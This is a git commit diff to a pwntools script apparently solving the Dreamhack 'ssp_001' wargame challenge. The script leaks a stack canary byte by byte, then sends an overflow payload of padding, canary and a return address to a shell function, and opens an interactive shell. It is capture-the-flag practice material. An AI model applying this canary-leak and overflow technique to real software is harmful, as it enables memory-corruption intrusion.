0c9b9d7bce031f0e7bfe9419e01dfdb6dd9c8479
1unaram <haram620@icloud.com>
2022-07-31 20:17:16 +0900

    07.31 20:17

--- Dreamhack.io/dh_ssp_001.py
+++ Dreamhack.io/dh_ssp_001.py
@@ -21,23 +21,24 @@ canary = []
 for i in range(0x08):
     p.sendafter(b'> ', b'P')
     p.recvuntil(b'Element index : ')
-    p.sendline(str(0x80 + i + 1))
+    p.sendline(bytes(str(0x80 + i + 1), 'utf-8'))
     c = p.recvline()[-4:-2]
     canary.append(hex(int(c.decode('utf-8'), 16)))
+    sleep(1)
 
 # Write Payload
 p.sendafter(b'> ', b'E')
 p.recvuntil(b'Name Size : ')
-p.sendline(str(0x50))
+p.sendline(bytes(str(0x50), 'utf-8'))
 p.recvuntil(b'Name : ')
 
 payload = b'A'*0x40
+# canary = reversed(canary)
 for i in canary:
-    i = i.ljust(4, '0')
-    payload += bytes(i[-2:], 'utf-8')
+    payload += bytes(chr(int(i, 16)), 'utf-8')
+payload += b'B'*0x04
 payload += p32(addr_sh)
-p.sendline(payload)
-
+p.send(payload)
 
 p.recvline()
 p.interactive()
